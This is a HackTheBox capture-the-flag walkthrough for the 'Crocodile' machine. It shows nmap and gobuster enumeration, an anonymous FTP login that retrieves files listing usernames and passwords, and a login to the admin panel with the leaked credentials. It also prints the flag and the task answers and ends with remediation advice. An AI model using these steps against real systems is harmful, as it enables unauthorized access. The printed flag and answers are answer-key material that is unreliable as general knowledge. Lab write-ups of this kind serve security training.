# Crocodile — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-1-red)
![OS](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-Anon%20FTP%20creds%20%E2%86%92%20web%20login-red)

> **Target:** `10.129.85.225`
> **Foothold:** **Anonymous FTP** leaks a username list and password list; those creds log into the hidden **web admin panel** (`login.php`).

---

## 🧭 Overview

Crocodile runs **FTP** (vsftpd 3.0.3) and **HTTP** (Apache 2.4.41). Anonymous FTP is enabled
and exposes two files — `allowed.userlist` and `allowed.userlist.passwd` — a matching set of
**usernames and passwords**. Directory brute-forcing the web server reveals a **`login.php`**
admin panel; logging in as **`admin`** with the leaked password returns the flag.

---

## 1. Reconnaissance

```bash
nmap -sC -sV 10.129.85.225
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp  ftp   33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp  ftp   62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
```

Two services, and Nmap's `ftp-anon` script already flags **anonymous FTP** with two
interesting files.

---

## 2. Loot — Anonymous FTP

```bash
ftp 10.129.85.225
# Name: anonymous   Password: (blank)  -> 230 Login successful.
ftp> dir
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

```bash
cat allowed.userlist
# aron
# pwnmeow
# egotisticalsw
# admin

cat allowed.userlist.passwd
# root
# Supersecretpassword1
# @BaASD&9032123sADS
# rKXM59ESxesUFHAd
```

SSH is **closed** (`port 22: Connection refused`), so these creds must be for the web app.

---

## 3. Web Enumeration

Brute-force directories/files (point `-w` at a **wordlist file**, not a directory):

```bash
gobuster dir -u http://10.129.85.225 -w /usr/share/dirb/wordlists/common.txt -x php,html
```

```text
/assets    (301)
/css       (301)
/dashboard (301)
/fonts     (301)
/js        (301)
config.php (200)
login.php  (200)   <-- admin authentication panel
logout.php (302 -> login.php)
```

> **Gotcha:** `-w /usr/share/dirb/wordlists` (a directory) errors with
> `failed to get number of lines: ... is a directory`. Pass the file, e.g. `common.txt`.

---

## 4. Foothold — Web Login

Browse to `http://10.129.85.225/login.php` and submit a username/password pair from the
leaked lists. The working combination:

```text
Username: admin
Password: rKXM59ESxesUFHAd
```

The panel authenticates and displays the flag.

---

## 5. Flag

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
c7110277ac44d78b6a9fff2232434d16
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | What Nmap switch runs the default set of scripts? | -sC |
| 2 | What version of FTP server is running on the target? | vsftpd 3.0.3 |
| 3 | What FTP code is returned for a successful anonymous login? | 230 |
| 4 | What username is used to log in anonymously to FTP? | anonymous |
| 5 | What FTP command downloads a file from the server? | get |
| 6 | What is the higher-privilege username in `allowed.userlist`? | admin |
| 7 | What version of Apache is running on port 80? | Apache httpd 2.4.41 |
| 8 | What Gobuster switch specifies file extensions to search for? | -x |
| 9 | What is the name of the PHP file that provides authentication? | login.php |
| 10 | Submit flag | `c7110277ac44d78b6a9fff2232434d16` |

</details>

---

## 🛡️ Lessons / Remediation
- **Disable anonymous FTP** and never store credential files on a shared service.
- **Never ship cleartext username/password lists** — and don't reuse them across services.
- **Protect admin panels** behind strong, unique credentials and consider MFA / IP allowlists.
- Remove default/leftover files (`config.php`, backups) from the web root.
